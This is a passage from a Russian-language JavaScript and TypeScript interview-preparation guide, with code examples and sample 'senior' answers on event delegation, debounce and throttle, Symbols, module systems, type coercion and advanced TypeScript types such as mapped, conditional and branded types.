```js
// Event Delegation — классический паттерн производительности
// Один слушатель вместо 1000 кнопок
document.querySelector('#product-list').addEventListener('click', (e) => {
  // closest поднимается по DOM пока не найдёт [data-product-id]
  const card = e.target.closest('[data-product-id]');
  if (!card) return;

  const productId = card.dataset.productId;
  const action = e.target.dataset.action; // 'buy', 'favorite', etc.

  handleProductAction(productId, action);
});
```

```js
// Остановка всплытия
element.addEventListener('click', (e) => {
  e.stopPropagation();     // стоп всплытие
  e.stopImmediatePropagation(); // стоп + другие слушатели на этом же элементе
  e.preventDefault();      // отменить дефолтное (submit, ссылка, etc.)
});
```

**🗣️ Pitch (Senior):**
> *"Event Delegation — ключевой паттерн производительности: вешаем 1 слушатель на контейнер вместо N на каждый элемент. React до v17 вешал ВСЕ обработчики на `document`, с v17 — на root-контейнер (это поддержало Microfrontends: несколько React-деревьев на странице). Интересный факт: `e.currentTarget` в async обработчиках становится null — сохраняй в переменную если нужен."*

---

### ❓ Q19. Debounce vs Throttle?

**Официальный ответ:**

- **Debounce**: ждёт паузы после последнего события. Выполняет ПОСЛЕ того, как пользователь перестал действовать
- **Throttle**: гарантирует выполнение не чаще раза в N мс

```js
// Debounce с leading опцией (вызов в начале и/или конце)
function debounce(fn, delay, { leading = false, trailing = true } = {}) {
  let timerId = null;

  return function debounced(...args) {
    const callNow = leading && !timerId;

    clearTimeout(timerId);

    timerId = setTimeout(() => {
      timerId = null;
      if (trailing && !callNow) fn.apply(this, args);
    }, delay);

    if (callNow) fn.apply(this, args);
  };
}

// Поиск — trailing (после паузы)
const searchDebounced = debounce(performSearch, 300);
input.addEventListener('input', (e) => searchDebounced(e.target.value));

// Кнопка отправки — leading (немедленно, потом блокировка)
const submitOnce = debounce(handleSubmit, 2000, { leading: true, trailing: false });
```

```js
// Throttle — ограничитель частоты
function throttle(fn, limit) {
  let lastCall = 0;
  let timerId = null;

  return function throttled(...args) {
    const now = Date.now();
    const remaining = limit - (now - lastCall);

    if (remaining <= 0) {
      clearTimeout(timerId);
      lastCall = now;
      fn.apply(this, args);
    } else if (!timerId) {
      // Гарантируем последний вызов после окончания throttle
      timerId = setTimeout(() => {
        lastCall = Date.now();
        timerId = null;
        fn.apply(this, args);
      }, remaining);
    }
  };
}

// Скролл, resize — throttle
window.addEventListener('scroll', throttle(() => {
  updateScrollIndicator();
}, 16)); // 16ms = 60fps
```

**🗣️ Pitch (Senior):**
> *"Важны неочевидные детали: debounce нужен `leading: true` для кнопок submit, чтобы первый клик был немедленным. Throttle с `trailing` гарантирует финальный вызов по окончании серии (важно для scroll-to-bottom детектора). В реальных проектах использую `lodash.debounce/throttle` — они battle-tested и правильно обрабатывают this, аргументы и edge-cases."*

---

### ❓ Q20. Symbols в JavaScript. Глобальный реестр?

**Официальный ответ:**

```js
// Symbol — уникальный примитив (даже с одинаковым описанием)
const s1 = Symbol('id');
const s2 = Symbol('id');
s1 === s2; // false — всегда уникальны

// Использование как ключа — избегает коллизий
const ID = Symbol('id');
const obj = {
  [ID]: 12345,
  name: 'Alice',
};
obj[ID]; // 12345
// Не видно в for...in, Object.keys(), JSON.stringify()!
Object.getOwnPropertySymbols(obj); // [Symbol(id)] — можно достать
```

```js
// Глобальный реестр — Symbol.for()
const a = Symbol.for('shared-key');
const b = Symbol.for('shared-key');
a === b; // true! — один символ из реестра

// Полезно для shared symbols между iframe / microfrontends
const EVENT_BUS_KEY = Symbol.for('myapp:event-bus');
window[EVENT_BUS_KEY] = new EventBus(); // безопасно от коллизий
```

```js
// Well-known Symbols — переопределение поведения объектов
class Range {
  constructor(from, to) { this.from = from; this.to = to; }

  // Symbol.iterator — объект становится итерируемым
  [Symbol.iterator]() {
    let current = this.from;
    const last = this.to;
    return {
      next() {
        return current <= last
          ? { value: current++, done: false }
          : { value: undefined, done: true };
      }
    };
  }

  // Symbol.toPrimitive — управление приведением типов
  [Symbol.toPrimitive](hint) {
    if (hint === 'number') return this.to - this.from;
    return `Range(${this.from}..${this.to})`;
  }
}

const r = new Range(1, 5);
[...r];         // [1, 2, 3, 4, 5]
for (const n of r) console.log(n); // 1, 2, 3, 4, 5
+r;             // 4 (длина range)
`${r}`;         // 'Range(1..5)'
```

**🗣️ Pitch (Senior):**
> *"Символы — основа метапрограммирования в JS. `Symbol.iterator` позволяет любому объекту работать в `for...of`, spread, деструктуризации. `Symbol.for()` решает проблему shared constants между разными realm-ами (iframe, microfrontends) без риска коллизий строк."*

---

## РАЗДЕЛ 4: Строгий код и Модульность

---

### ❓ Q21. Strict Mode ('use strict')?

**Официальный ответ:**

```js
// Что запрещает strict mode:
'use strict';

x = 5;              // ❌ ReferenceError: необъявленная переменная
delete Object.prototype; // ❌ TypeError: нельзя удалить non-configurable
with(obj) {}        // ❌ SyntaxError: with запрещён

function fn() {
  console.log(this); // undefined (не window!)
}
fn();

// В ES Modules и классах strict mode ВСЕГДА включён автоматически
// import 'module'; // strict уже активен
```

```js
// Strict mode и производительность V8
// Без strict: JIT должен проверять "не обращается ли fn к window неявно?"
// Со strict: JIT знает, что this = undefined при обычном вызове → оптимизирует
```

**🗣️ Pitch (Senior):**
> *"В современном коде strict mode включён автоматически в ESM и классах. Главная практическая польза: `this` без контекста = `undefined` (а не `window`), что сразу выдаёт ошибку вместо скрытого бага. Strict mode был первым шагом к предсказуемости V8-оптимизаций."*

---

### ❓ Q22. ES Modules (ESM) vs CommonJS (CJS)?

**Официальный ответ:**

| | ESM (`import/export`) | CJS (`require`) |
|---|---|---|
| Загрузка | Асинхронная | Синхронная |
| Анализ | Статический (AST) | Динамический (рантайм) |
| Экспорт | Live binding (ссылка) | Копирование значения |
| Tree Shaking | ✅ Возможен | ❌ Сложно |
| `import()` внутри `if` | ✅ Dynamic import | ✅ `require()` внутри if |

```js
// ESM — экспорт это ССЫЛКА (live binding)
// counter.mjs
export let count = 0;
export function increment() { count++; }

// main.mjs
import { count, increment } from './counter.mjs';
console.log(count); // 0
increment();
console.log(count); // 1 — видим изменение через живую ссылку!

// CJS — экспорт это КОПИЯ
// counter.js
let count = 0;
module.exports = { count, increment: () => count++ };

// main.js
const { count, increment } = require('./counter');
console.log(count); // 0
increment();
console.log(count); // 0 — скопировали значение, оригинал изменился, нам нет
```

```js
// Dynamic import — ленивая загрузка (работает в ESM)
async function loadHeavyFeature() {
  const { HeavyComponent } = await import('./heavy-feature.js');
  return HeavyComponent;
}

// Tree Shaking — возможен ТОЛЬКО с ESM
// Бандлер анализирует граф импортов на этапе сборки (до рантайма)
import { sum } from 'lodash-es'; // бандлер включит ТОЛЬКО sum, не всю lodash
```

**🗣️ Pitch (Senior):**
> *"Статический анализ ESM позволяет Webpack/Vite/Rollup делать Tree Shaking — устранение мёртвого кода. С CJS это геометрически невозможно: `require()` может быть внутри `if(condition)`, и бандлер не знает что нужно до рантайма. Переход экосистемы на ESM — причина, почему современные библиотеки публикуют `.mjs` версии."*

---

### ❓ Q23. Type Coercion. `==` vs `===`, ToPrimitive?

**Официальный ответ:**

```js
// === строгое сравнение (тип + значение)
1 === '1';   // false
null === undefined; // false

// == с приведением типов (Abstract Equality)
1 == '1';    // true (строка → число)
0 == false;  // true (false → 0)
null == undefined; // true (специальное правило!)
null == 0;   // false (null только == undefined)
[] == false; // true ([] → '' → 0, false → 0)
```

```js
// Как объект приводится к примитиву (ToPrimitive):
// 1. Проверяет Symbol.toPrimitive
// 2. Если hint=number → valueOf() → toString()
// 3. Если hint=string → toString() → valueOf()

const obj = {
  valueOf() { return 42; },
  toString() { return 'object'; },
  [Symbol.toPrimitive](hint) {
    if (hint === 'number') return 42;
    if (hint === 'string') return 'forty-two';
    return true; // default hint
  }
};

+obj;        // 42 (number hint)
`${obj}`;    // 'forty-two' (string hint)
obj + '';    // 'true' (default hint → toString → '42'... зависит от реализации)
```

```js
// Практика: единственный легальный кейс для ==
function process(val) {
  // val == null эквивалентно val === null || val === undefined
  // Короче, но не менее явно для опытного разработчика
  if (val == null) return defaultValue;
  return transform(val);
}
```

**🗣️ Pitch (Senior):**
> *"В команде мы всегда используем `===`, кроме `val == null` (сокращение для проверки и null, и undefined). Понимание ToPrimitive нужно при создании кастомных объектов-значений (Value Objects) в DDD — управляем сериализацией через Symbol.toPrimitive."*

---

### ❓ Q24. Currying (Каррирование) и Partial Application?

**Официальный ответ:**

```js
// Currying — f(a, b, c) → f(a)(b)(c)
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    }
    return function(...args2) {
      return curried.apply(this, args.concat(args2));
    };
  };
}

const add = curry((a, b, c) => a + b + c);
add(1)(2)(3);    // 6
add(1, 2)(3);    // 6
add(1)(2, 3);    // 6
add(1, 2, 3);    // 6
```

```js
// Partial Application — частичное применение аргументов
const multiply = (a, b) => a * b;
const double = multiply.bind(null, 2); // частично применяем a=2
double(5);  // 10
double(10); // 20

// Через Function.prototype.bind (встроенный partial apply)
const log = (level, message) => console.log(`[${level}] ${message}`);
const warn = log.bind(null, 'WARN');
const error = log.bind(null, 'ERROR');

warn('Что-то пошло не так');   // [WARN] Что-то пошло не так
error('Критическая ошибка');    // [ERROR] Критическая ошибка
```

```js
// React паттерн — каррирование в обработчиках
function ItemList({ items, onAction }) {
  return items.map(item => (
    <button
      key={item.id}
      // handleAction(item.id) возвращает обработчик события
      onClick={handleAction(item.id)}
    >
      {item.name}
    </button>
  ));
}

const handleAction = (id) => (event) => {
  event.preventDefault();
  console.log(`Action on item ${id}`);
};
```

**🗣️ Pitch (Senior):**
> *"Каррирование — основа функционального программирования (Ramda, Lodash/fp). В React используется для HOC-паттернов и обработчиков с контекстом. Важно понимать разницу: каррирование = трансформация арности функции. Partial application = частичное применение конкретных аргументов."*

---

### ❓ Q25. Mixins в JS и TS?

**Официальный ответ:**

```js
// JS нет множественного наследования. Mixin — способ «подмешать» методы.

// Функциональный Mixin (современный подход)
const Serializable = (superclass) => class extends superclass {
  serialize() {
    return JSON.stringify(this);
  }
  static deserialize(json) {
    return Object.assign(new this(), JSON.parse(json));
  }
};

const Validatable = (superclass) => class extends superclass {
  validate() {
    return Object.keys(this).every(key => this[key] !== null);
  }
};

class BaseEntity {
  constructor(id) { this.id = id; }
}

// Композиция миксинов
class User extends Serializable(Validatable(BaseEntity)) {
  constructor(id, name) {
    super(id);
    this.name = name;
  }
}

const user = new User(1, 'Alice');
user.validate();  // true
user.serialize(); // '{"id":1,"name":"Alice"}'
```

**🗣️ Pitch (Senior):**
> *"Миксины через Class Factory Pattern (функции возвращающие расширенный класс) — единственный чистый способ. В React они устарели (пришли HOC и Hooks). Но в UI-библиотеках (Stencil, Lit) и ванильном TS миксины живы как способ переиспользовать поведение без жёсткого наследования."*

---

## РАЗДЕЛ 5: TypeScript: Основы

---

### ❓ Q26. Type vs Interface? Declaration Merging?

**Официальный ответ:**

```ts
// Interface — поддерживает Declaration Merging
interface User { name: string; }
interface User { age: number; }     // ✅ Сольётся!
const u: User = { name: 'Alice', age: 30 }; // нужны ОБА поля

// Расширение сторонних типов (Module Augmentation)
declare module 'express' {
  interface Request { userId?: string; } // добавляем поле в Request
}

// Наследование
interface Admin extends User {
  role: 'admin';
}
```

```ts
// Type — гибче для сложных преобразований
type ID = string | number;
type Status = 'loading' | 'success' | 'error';
type Nullable<T> = T | null;

// Только type поддерживает:
type Union = string | number;           // объединение
type Intersection = User & Admin;       // пересечение
type Tuple = [string, number, boolean]; // кортеж
type Conditional<T> = T extends string ? 'str' : 'other'; // conditional
type Keys = keyof User;                 // keyof

// ❌ type НЕ поддерживает Declaration Merging
type User = { name: string };
type User = { age: number }; // ❌ Error: Duplicate identifier 'User'
```

```ts
// Правило выбора:
// interface — для объектов и API контрактов (Request/Response shapes, OOP)
// type — для сложных трансформаций, union-ов, утилитарных типов
```

**🗣️ Pitch (Senior):**
> *"Для описания формы объектов в ООП — `interface`. Для хитрой бизнес-логики и маппинга типов — `type`. Declaration Merging я использую для расширения `window` (window.analytics, window.__REDUX_DEVTOOLS_EXTENSION__) и для расширения тем MUI/styled-components."*

---

### ❓ Q27. `any` vs `unknown` vs `never`? Exhaustive Check?

**Официальный ответ:**

```ts
// any — полное отключение TypeScript
let a: any = fetchData();
a.foo.bar.baz.nonexistent(); // TS молчит! Runtime crash ❌
JSON.parse(a);               // TS молчит! Любые операции разрешены

// unknown — типобезопасный any (операции только после сужения)
let u: unknown = fetchData();
u.toUpperCase();             // ❌ TS Error: Object is of type 'unknown'

// Нужно сузить тип
if (typeof u === 'string') {
  u.toUpperCase();           // ✅ TS знает: u это string
}
if (u instanceof Error) {
  u.message;                 // ✅ TS знает: u это Error
}

// never — тип без значений (невозможное состояние)
type Never = string & number; // string И number одновременно = never

function throwError(msg: string): never {
  throw new Error(msg); // функция никогда не возвращает значение
}

function infiniteLoop(): never {
  while (true) {} // никогда не завершается
}
```

```ts
// Exhaustive Check — защита от пропущенных кейсов
function assertNever(x: never): never {
  throw new Error(`Необработанный кейс: ${JSON.stringify(x)}`);
}

type PaymentStatus = 'pending' | 'success' | 'failed' | 'refunded';

function handlePayment(status: PaymentStatus): string {
  switch (status) {
    case 'pending':  return '⏳ Ожидание';
    case 'success':  return '✅ Успешно';
    case 'failed':   return '❌ Ошибка';
    case 'refunded': return '↩️ Возврат';
    default:
      // Если добавить 'disputed' в тип и забыть обработать —
      // 'disputed' попадёт сюда и TS выбросит COMPILE-TIME ошибку ✅
      return assertNever(status);
  }
}
```

**🗣️ Pitch (Senior):**
> *"Exhaustive Check — мощнейший паттерн в финтехе. Когда добавляем новый статус транзакции, TS сам найдёт все switch-и, которые его не обрабатывают. `unknown` vs `any`: в публичных API и fetch-ответах всегда `unknown`, затем Zod/Yup для валидации и сужения — это единственный по-настоящему type-safe способ работы с внешними данными."*

---

### ❓ Q28. Mapped Types и Key Remapping (`as`)?

**Официальный ответ:**

```ts
// Базовый синтаксис Mapped Type
type Readonly<T> = {
  readonly [K in keyof T]: T[K];
};

type Optional<T> = {
  [K in keyof T]?: T[K];
};

// Модификаторы: + (добавить), - (убрать)
type Mutable<T> = {
  -readonly [K in keyof T]: T[K]; // убираем readonly
};

type Required<T> = {
  [K in keyof T]-?: T[K]; // убираем опциональность
};
```

```ts
// Key Remapping (as) — переименование ключей (TS 4.1+)
type Getters<T> = {
  [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K];
};

interface UserStore {
  name: string;
  age: number;
  email: string;
}

type UserGetters = Getters<UserStore>;
// {
//   getName: () => string;
//   getAge: () => number;
//   getEmail: () => string;
// }
```

```ts
// Фильтрация ключей (исключение через never)
type OnlyFunctions<T> = {
  [K in keyof T as T[K] extends Function ? K : never]: T[K];
};

type OnlyStrings<T> = {
  [K in keyof T as T[K] extends string ? K : never]: T[K];
};

interface Mixed {
  name: string;
  age: number;
  greet: () => void;
  city: string;
}

type StringFields = OnlyStrings<Mixed>;
// { name: string; city: string }

type Methods = OnlyFunctions<Mixed>;
// { greet: () => void }
```

**🗣️ Pitch (Senior):**
> *"Mapped Types — кодогенератор типов. Пример из практики: `type EventHandlers<T> = { [K in keyof T as \`on${Capitalize<string & K>}\`]?: (val: T[K]) => void }`. Это создаёт типизированные пропсы-коллбэки для любого объекта данных. Используется в таблицах, формах, и библиотеках компонентов."*

---

### ❓ Q29. Conditional Types и `infer`?

**Официальный ответ:**

```ts
// Conditional Type — тернарный оператор для типов
type IsString<T> = T extends string ? true : false;

type A = IsString<string>;   // true
type B = IsString<number>;   // false
type C = IsString<'hello'>;  // true (литерал extends string)
```

```ts
// infer — извлечение типа изнутри
// Как деструктуризация, но для типов

// Встроенный ReturnType под капотом:
type MyReturnType<T> = T extends (...args: any[]) => infer R ? R : never;

// Встроенный Awaited под капотом (рекурсивный):
type MyAwaited<T> = T extends Promise<infer U> ? MyAwaited<U> : T;

// Parameters под капотом:
type MyParameters<T> = T extends (...args: infer P) => any ? P : never;
```

```ts
// Практика: извлечение типов из сложных структур
// (когда библиотека не экспортирует типы напрямую)

import { someFunction } from 'some-lib';
type FnReturn = Awaited<ReturnType<typeof someFunction>>;
type FnArgs = Parameters<typeof someFunction>;

// Извлечение параметров роута из строки (Template Literal + infer)
type ExtractRouteParams<S extends string> =
  S extends `${infer _}:${infer Param}/${infer Rest}`
    ? Param | ExtractRouteParams<`/${Rest}`>
    : S extends `${infer _}:${infer Param}`
    ? Param
    : never;

type Params = ExtractRouteParams<'/users/:userId/posts/:postId'>;
// 'userId' | 'postId'

// Теперь типизированный роутер:
function navigate<S extends string>(
  path: S,
  params: Record<ExtractRouteParams<S>, string>
): void { /* ... */ }

navigate('/users/:userId/posts/:postId', {
  userId: '123',
  postId: '456',
  // unknown: '789', // ❌ TS Error!
});
```

**🗣️ Pitch (Senior):**
> *"С `infer` под капотом работают встроенные `ReturnType`, `Awaited`, `Parameters`. В реальных проектах я использую это для извлечения типов из библиотек без публичного экспорта типов, и для строгой типизации роутеров без дублирования определений."*

---

### ❓ Q30. Covariance, Contravariance, Bivariance?

**Официальный ответ:**

```ts
class Animal { name = 'animal'; }
class Dog extends Animal { breed = 'husky'; }
class Cat extends Animal { indoor = true; }

// Covariance (ковариантность) — возвращаемые типы
// Функция может вернуть БОЛЕЕ УЗКИЙ тип — это безопасно
type AnimalFactory = () => Animal;
type DogFactory = () => Dog;

const factory: AnimalFactory = (() => new Dog()); // ✅ Dog extends Animal
```

```ts
// Contravariance (контравариантность) — аргументы функции
// Функция должна принимать БОЛЕЕ ШИРОКИЙ тип

type AnimalHandler = (a: Animal) => void;
type DogHandler = (d: Dog) => void;

// ✅ AnimalHandler совместим с DogHandler
// Функция принимающая Animal может обработать и Dog
const handler: DogHandler = ((a: Animal) => console.log(a.name));

// ❌ DogHandler НЕ совместим с AnimalHandler
// Функция ожидает Dog.breed, но может получить Cat
const handler2: AnimalHandler = ((d: Dog) => console.log(d.breed));
// Error: 'Cat' is not assignable to 'Dog'
```

```ts
// strictFunctionTypes: true (входит в strict)
// Делает параметры строго контравариантными для функций-полей

interface Strict {
  handler: (a: Animal) => void; // контравариантный ✅
}

interface Bivariant {
  handler(a: Animal): void; // бивариантный (метод) — менее безопасен
}

// in/out модификаторы (TS 4.7+) — явная аннотация вариантности
interface Producer<out T> { produce(): T; }     // только возвращает T
interface Consumer<in T> { consume(val: T): void; } // только принимает T
```

**🗣️ Pitch (Senior):**
> *"На пальцах: если API ожидает коллбэк `(a: Animal) => void`, а ты передаёшь `(d: Dog) => console.log(d.breed)` — в рантайме туда может прийти Cat, и `d.breed` упадёт. TS с `strictFunctionTypes` поймает это. Интересный нюанс: методы интерфейсов (синтаксис `method()`) бивариантны из-за обратной совместимости, поля-функции (`prop: () =>`) — строго контравариантны."*

---

### ❓ Q31. Generics: Constraints и Default Types?

**Официальный ответ:**

```ts
// Constraint (extends) — гарантирует наличие свойств
interface Identifiable {
  id: string | number;
}

function findById<T extends Identifiable>(items: T[], id: T['id']): T | undefined {
  return items.find(item => item.id === id);
}

// T может быть любым объектом с полем id — строгая связь сохранена
interface User { id: string; name: string; }
interface Product { id: number; price: number; }

findById<User>([{ id: '1', name: 'Alice' }], '1');         // ✅
findById<Product>([{ id: 1, price: 100 }], 1);             // ✅
findById<{ name: string }>([{ name: 'no id' }], 1);        // ❌ Error
```

```ts
// Default Type — дефолт если тип не выведен из контекста
type ApiResponse<T = unknown> = {
  data: T;
  status: number;
  message: string;
};

const generic: ApiResponse = { data: null, status: 200, message: 'ok' };
// T = unknown (дефолт)

const typed: ApiResponse<User[]> = { data: users, status: 200, message: 'ok' };
// T = User[]
```

```ts
// Продвинутый паттерн: типизированная таблица с обязательным id
function useTable<T extends { id: string | number }>(
  data: T[],
  columns: (keyof T)[]
) {
  // columns автоматически ограничен ключами T ✅
  return data.map(row => columns.map(col => row[col]));
}

useTable(users, ['name', 'age']);     // ✅
useTable(users, ['nonexistent']);     // ❌ TS Error
```

**🗣️ Pitch (Senior):**
> *"Generics — функции для типов. Constraint `extends` критичен в хуках для таблиц и списков: `T extends { id: string | number }` — обязываем каждый объект иметь id, сохраняя строгую связь с исходным типом T. Default Type упрощает API библиотек: можно не указывать тип явно в простых случаях."*

---

### ❓ Q32. Branded Types (Nominal Typing)?

**Официальный ответ:**

```ts
// Проблема: TS структурный — number = number
type USD = number;
type EUR = number;

function convertToUSD(amount: EUR, rate: number): USD {
  return amount * rate;
}

const price: USD = 100;
convertToUSD(price, 1.1); // ✅ TS не видит ошибки — оба number! ❌ логический баг
```

```ts
// Решение 1: Branded Type (простой)
type USD = number & { readonly __brand: 'USD' };
type EUR = number & { readonly __brand: 'EUR' };
type RUB = number & { readonly __brand: 'RUB' };

// Конструкторы с валидацией
function toUSD(n: number): USD {
  if (n < 0) throw new Error('USD не может быть отрицательным');
  return n as USD;
}
function toEUR(n: number): EUR { return n as EUR; }

function addUSD(a: USD, b: USD): USD { return (a + b) as USD; }

const price = toUSD(100);
const rate = toEUR(85);

addUSD(price, rate); // ❌ TS Error: Argument of type 'EUR' is not assignable to 'USD'
addUSD(price, toUSD(50)); // ✅
```

```ts
// Решение 2: unique symbol (строжайшая номинальность)
declare const _usdBrand: unique symbol;
declare const _eurBrand: unique symbol;

type USD = number & { readonly [_usdBrand]: void };
type EUR = number & { readonly [_eurBrand]: void };

// USD и EUR — структурно РАЗНЫЕ типы, даже если у них одинаковые поля
```

```ts
// Применение в финтехе: ID-типы
type UserId = string & { readonly __brand: 'UserId' };
type OrderId = string & { readonly __brand: 'OrderId' };

function getUser(id: UserId): Promise<User> { /* ... */ }
function getOrder(id: OrderId): Promise<Order> { /* ... */ }

const userId = '123' as UserId;
const orderId = '456' as OrderId;

getUser(orderId); // ❌ TS Error — OrderId ≠ UserId ✅ поймали баг!
```

**🗣️ Pitch (Senior):**
> *"В финтехе Branded Types — маст-хэв. Путаница USD/EUR или UserId/OrderId — это реальные многомиллионные баги. Branded Type — zero runtime overhead (просто number/string), но даёт compile-time защиту от перепутанных аргументов. Это единственный способ получить номинальную типизацию в структурном TS."*

---

### ❓ Q33. Utility Types под капотом?

**Официальный ответ:**

```ts
// Реализации под капотом

type MyPartial<T> = { [K in keyof T]?: T[K] };
type MyRequired<T> = { [K in keyof T]-?: T[K] };
type MyReadonly<T> = { readonly [K in keyof T]: T[K] };
type MyRecord<K extends keyof any, V> = { [P in K]: V };
type MyPick<T, K extends keyof T> = { [P in K]: T[P] };
type MyOmit<T, K extends keyof T> = Pick<T, Exclude<keyof T, K>>;
type MyExclude<T, U> = T extends U ? never : T;
type MyExtract<T, U> = T extends U ? T : never;
type MyNonNullable<T> = T extends null | undefined ? never : T;
type MyReturnType<T> = T extends (...args: any[]) => infer R ? R : never;
type MyParameters<T> = T extends (...args: infer P) => any ? P : never;
```

```ts
// Кастомные продвинутые утилиты

// DeepPartial — рекурсивный Partial для глубоко вложенных конфигов
type DeepPartial<T> = T extends object
  ? { [K in keyof T]?: DeepPartial<T[K]> }
  : T;

// DeepReadonly — неизменяемое дерево
type DeepReadonly<T> = T extends (infer U)[]
  ? ReadonlyArray<DeepReadonly<U>>
  : T extends object
  ? { readonly [K in keyof T]: DeepReadonly<T[K]> }
  : T;

// PickByValue — выбрать ключи по типу значения
type PickByValue<T, V> = {
  [K in keyof T as T[K] extends V ? K : never]: T[K];
};

interface Form {
  name: string;
  age: number;
  email: string;
  isAdmin: boolean;
}

type StringFields = PickByValue<Form, string>;
// { name: string; email: string }
```

**🗣️ Pitch (Senior):**
> *"Знание реализации позволяет легко собирать свои утилиты. `DeepPartial` нужен для типизации частичных обновлений конфигурации и патч-операций. `PickByValue` — для автогенерации форм из типов данных. Понимание `Exclude = never в conditional` объясняет как работает дистрибутивность conditional types."*

---

### ❓ Q34. Оператор `satisfies` (TS 4.9+)?

**Официальный ответ:**

```ts
// Проблема: обычная аннотация расширяет тип (теряем узкие значения)
type Route = Record<string, string>;

const routes: Route = {
  home: '/',
  profile: '/profile',
};
routes.home;           // тип: string (слишком широкий)
routes.nonexistent;    // ✅ TS не ругается — любой string ключ разрешён
```

```ts
// satisfies — проверяет соответствие, НО сохраняет узкий тип
type AppRoute = 'home' | 'profile' | 'settings';

const routes = {
  home: '/',
  profile: '/profile',
  settings: '/settings',
} satisfies Record<AppRoute, string>;

routes.home;          // тип: '/' (литеральный!) ✅ автокомплит работает
routes.settings;      // тип: '/settings' ✅
// routes.unknown;    // ❌ TS Error — нет в AppRoute
// routes.home = 42;  // ❌ TS Error — string, не number
```

```ts
// Мощный паттерн: объекты с разными типами значений
type ThemeColor = { r: number; g: number; b: number } | string;

const palette = {
  primary: { r: 0, g: 112, b: 243 }, // объект RGB
  danger: '#ff4444',                   // строка HEX
} satisfies Record<string, ThemeColor>;

// TS знает конкретные типы!
palette.primary.r;              // ✅ number
palette.danger.toUpperCase();  // ✅ string метод
palette.primary.toUpperCase(); // ❌ Error: не string!
```

**🗣️ Pitch (Senior):**
> *"До `satisfies` при аннотации `const x: SomeType = {...}` TS расширял тип объекта до SomeType и терял узкие литеральные типы. `satisfies` проверяет корректность, но сохраняет самую узкую форму. Идеально для роутеров, тем, конфигов — где нужна проверка и автокомплит одновременно."*

---

### ❓ Q35. Type Guards: `is`, Assertion Signatures?

**Официальный ответ:**

```ts
// Встроенные Type Guards
function process(val: string | number | null) {
  if (typeof val === 'string') {
    val.toUpperCase(); // ✅ string
  } else if (typeof val === 'number') {
    val.toFixed(2);    // ✅ number
  } else {
    val;               // ✅ null
  }
}

// instanceof
if (error instanceof TypeError) { /* ... */ }

// in
if ('name' in obj) { /* obj имеет поле name */ }

// Discriminated Union — лучший паттерн
type Shape =
  | { kind: 'circle'; radius: number }
  | { kind: 'rect'; width: number; height: number };

function area(shape: Shape): number {
  switch (shape.kind) {
    case 'circle': return Math.PI * shape.radius ** 2;
    case 'rect':   return shape.width * shape.height;
  }
}
```

```ts
// User-defined Type Guard (is)
function isError(val: unknown): val is Error {
  return val instanceof Error;
}

function isUser(val: unknown): val is User {
  // ⚠️ Риск: TS верит возвращаемому boolean!
  // Если написать просто return true — TS поверит, но это баг
  return (
    typeof val === 'object' &&
    val !== null &&
    'name' in val &&
    'id' in val &&
    typeof (val as any).name === 'string'
  );
}

// Assertion Signature — выбрасывает если не прошло
function assertIsString(val: unknown): asserts val is string {
  if (typeof val !== 'string') {
    throw new TypeError(`Expected string, got ${typeof val}`);
  }
}

const data: unknown = fetchData();
assertIsString(data);
data.toUpperCase(); // ✅ TS знает: data это string после assert
```

**🗣️ Pitch (Senior):**
> *"User-defined type guards — слабое место безопасности TS: можно случайно вернуть true для неправильного типа. Решение: использовать Zod для валидации внешних данных — `schema.parse(data)` автоматически сужает тип и бросает понятные ошибки. Это DRY: одна схема = runtime валидация + compile-time тип."*

---

### ❓ Q36. `as const` и вывод кортежей?

**Официальный ответ:**

```ts
// as const — замораживает литералы до конкретных типов
const status = 'loading';          // тип: string (без as const)
const status2 = 'loading' as const; // тип: 'loading' (литерал!)

// Массив → readonly кортеж
const arr = [1, 'hello', true];         // тип: (number | string | boolean)[]
const tuple = [1, 'hello', true] as const; // тип: readonly [1, 'hello', true]
```

```ts
// Паттерн: Union из массива констант
const ROLES = ['admin', 'user', 'moderator', 'guest'] as const;
type Role = typeof ROLES[number]; // 'admin' | 'user' | 'moderator' | 'guest'

// Добавляешь в ROLES → тип автоматически обновляется! DRY ✅

// Паттерн: объект-константа как замена Enum
const HttpStatus = {
  OK: 200,
  CREATED: 201,
  BAD_REQUEST: 400,
  UNAUTHORIZED: 401,
  NOT_FOUND: 404,
  SERVER_ERROR: 500,
} as const;

type HttpStatusCode = typeof HttpStatus[keyof typeof HttpStatus];
// 200 | 201 | 400 | 401 | 404 | 500

function handleResponse(status: HttpStatusCode) { /* ... */ }
handleResponse(HttpStatus.OK);  // ✅
handleResponse(200);            // ✅ литерал тоже принимается
handleResponse(999);            // ❌ TS Error!
```

```ts
// Сравнение с Enum (почему POJO + as const лучше)

// enum Direction — создаёт РАНТАЙМ объект (мусор в бандле)
enum Direction { Up = 'UP', Down = 'DOWN' }
// Компилируется в:
// var Direction;
// Direction["Up"] = "UP"; Direction["Down"] = "DOWN";

// ✅ POJO + as const — нет рантайм мусора (только типы)
const Direction = { Up: 'UP', Down: 'DOWN' } as const;
type Direction = typeof Direction[keyof typeof Direction]; // 'UP' | 'DOWN'
// В рантайме: просто объект. В TS: строгие типы.
```

**🗣️ Pitch (Senior):**
> *"`as const` — золотой стандарт для констант. Создаём Union из массива, и при добавлении нового значения тип обновляется автоматически — DRY принцип. Для Enum альтернатива через POJO не создаёт рантайм мусора, что особенно важно при `isolatedModules: true` (Vite/Next.js) — там `const enum` вообще ломает сборку."*

---

### ❓ Q37. Declaration Merging и Module Augmentation?

**Официальный ответ:**

```ts
// Расширение глобального window
declare global {
  interface Window {
    analytics: {
      track: (event: string, props?: Record<string, unknown>) => void;
    };
    __REDUX_DEVTOOLS_EXTENSION__?: () => any;
  }
}

// Теперь window.analytics.track типизирован ✅
window.analytics.track('button_click', { buttonId: 'submit' });
```

```ts
// Module Augmentation — расширение типов сторонней библиотеки
declare module 'styled-components' {
  export interface DefaultTheme {
    colors: {
      primary: string;
      danger: string;
      brandOrange: string; // наш кастомный цвет ✅
    };
    spacing: (n: number) => string;
  }
}

// Теперь в компонентах theme.colors.brandOrange типизирован
const Button = styled.button`
  color: ${({ theme }) => theme.colors.brandOrange}; // ✅
`;
```

```ts
// Расширение Request в Express
declare module 'express-serve-static-core' {
  interface Request {
    userId?: string;
    sessionData?: SessionData;
  }
}

// В middleware:
app.use((req, res, next) => {
  req.userId = extractUserId(req.headers.authorization);
  next();
});

// В route handler — req.userId уже типизирован ✅
app.get('/profile', (req, res) => {
  const id = req.userId; // string | undefined
});
```

**🗣️ Pitch (Senior):**
